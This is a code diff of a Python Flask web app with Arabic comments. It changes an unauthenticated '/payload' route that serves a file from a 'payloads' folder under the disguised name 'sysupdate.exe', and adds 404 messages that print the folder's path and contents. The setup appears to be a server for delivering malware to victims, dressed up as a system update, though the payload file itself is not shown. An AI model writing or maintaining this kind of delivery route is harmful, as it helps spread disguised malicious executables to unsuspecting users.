@@ -87,25 +87,42 @@ def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# ===== مسار التحميل العام (بدون حماية) =====
+# ===== مسار التحميل العام (بدون حماية) - النسخة النهائية =====
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 @app.route('/payload')
 def download_payload():
+    """
+    يحاول إيجاد الملف في مجلد payloads/ بأي من الأسماء التالية:
+    - sysupdate.exe
+    - sysupdate
+    - sysupdate (بدون امتداد)
+    """
     try:
-        # نحاول نبحث عن الملف سواء كان sysupdate أو sysupdate.exe
-        possible_names = ['sysupdate.exe', 'sysupdate']
-        file_path = None
-        for name in possible_names:
-            test_path = os.path.join(BASE_DIR, 'payloads', name)
-            if os.path.exists(test_path):
-                file_path = test_path
-                break
+        # قائمة الأسماء المحتملة
+        possible_files = ['sysupdate.exe', 'sysupdate']
+        payload_dir = os.path.join(BASE_DIR, 'payloads')
         
-        if not file_path:
-            return f"الملف غير موجود في مجلد payloads (ابحث عن sysupdate أو sysupdate.exe)", 404
+        # نبحث عن الملف
+        for filename in possible_files:
+            file_path = os.path.join(payload_dir, filename)
+            if os.path.exists(file_path):
+                return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
+        
+        # إذا لم نجده، نعرض محتويات المجلد للمساعدة في التشخيص
+        try:
+            files_in_payloads = os.listdir(payload_dir)
+            return f"""الملف غير موجود في مجلد payloads.
+            المجلد الموجود: {payload_dir}
+            الملفات الموجودة: {files_in_payloads}
+            ابحث عن: sysupdate.exe أو sysupdate
+            """, 404
+        except FileNotFoundError:
+            return f"""مجلد payloads غير موجود على السيرفر.
+            المسار المطلوب: {payload_dir}
+            تأكد من رفع الملف إلى هذا المجلد.
+            """, 404
             
-        return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
     except Exception as e:
         return f"خطأ داخلي: {str(e)}", 500
 
